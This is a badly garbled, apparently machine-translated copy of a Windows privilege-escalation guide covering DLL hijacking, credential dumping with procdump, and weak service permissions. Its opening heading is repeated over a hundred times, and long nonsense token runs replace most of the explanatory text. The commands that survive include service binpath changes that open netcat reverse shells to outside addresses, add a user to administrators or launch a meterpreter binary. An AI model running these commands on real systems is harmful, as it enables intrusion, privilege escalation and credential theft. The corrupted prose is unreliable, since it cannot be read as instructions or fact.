**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the processes binaries (DLL Hijacking)**

**Checking permissions of the folders of the
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### qawHaq jatlh

**procdump** vItlhutlh **sysinternals**-Daq **running process**-e' vItlhutlh. FTP vItlhutlh **credentials in clear text**-e' vItlhutlh, qawHaq jatlh 'ej credentials vItlhutlh.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**Applications running as SYSTEM may allow an user to spawn a CMD, or browse directories.**

Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## Services

Get a list of services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permissions

**sc** vIghorghDI' 'e' vItlhutlh.
```bash
sc qc <service_name>
```
**accesschk** binary-**'eSInternals**_-Daq **binary**_vItlhutlh**_DIvI'**_eS**_Daq**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**_eSInternals**_vItlhutlh**_DIvI'**
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
ghItlh 'oH "Authenticated Users" DaH jImej. "Authenticated Users" jImejDaq 'e' vItlhutlh.
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[accesschk.exe ni XP laH download HIq](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Enable service

vaj (SSDPSRV jatlh):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

vajDI' vItlhutlh.
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ghItlhvam, upnphost tetlh SSDPSRV Daq. (XP SP1)**

**vItlhutlh** vaj vItlhutlhbe'chugh vay':
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

In the scenario where the "Authenticated users" group possesses **SERVICE_ALL_ACCESS** on a service, modification of the service's executable binary is possible. To modify and execute **sc**:

### **tlhIngan Hol**

ghItlhvam "Authenticated users" qutlh **SERVICE_ALL_ACCESS** vItlhutlh **SERVICE_ALL_ACCESS** vIleghlaHbe'chugh, **sc** vItlhutlh je vItlhutlh.
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### QapHa' ghom

DaH jImej:
```
net stop [serviceName]
net start [serviceName]
```

### HTML Translation:

<h3>QapHa' ghom</h3>

<p>DaH jImej:</p>

<pre><code>net stop [serviceName]
net start [serviceName]
</code></pre>
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
### Privileges can be escalated through various permissions:
- **SERVICE_CHANGE_CONFIG**: Allows reconfiguration of the service binary.
- **WRITE_DAC**: Enables permission reconfiguration, leading to the ability to change service configurations.
- **WRITE_OWNER**: Permits ownership acquisition and permission reconfiguration.
- **GENERIC_WRITE**: Inherits the ability to change service configurations.
- **GENERIC_ALL**: Also inherits the ability to change service configurations.

For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.

### Services binaries weak permissions

**Check if you can modify the binary that is executed by a service** or if you have **write permissions on the folder** where the binary is located ([**DLL Hijacking**](dll-hijacking.md))**.**\
You can get every binary that is executed by a service using **wmic** (not in system32) and check your permissions using **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
**sc** **'ej** **icacls** **vaj** **laH**:

```plaintext
You can also use **sc** and **icacls**:
```

```plaintext
**sc** **'ej** **icacls** **vaj** **laH**:
```
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry modify permissions

**tlhIngan Hol**:

**Qap** vaj **tlhIngan Hol** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** **'ej** **ghItlh** **'e'** **DIvI'**Daj **ghItlh** 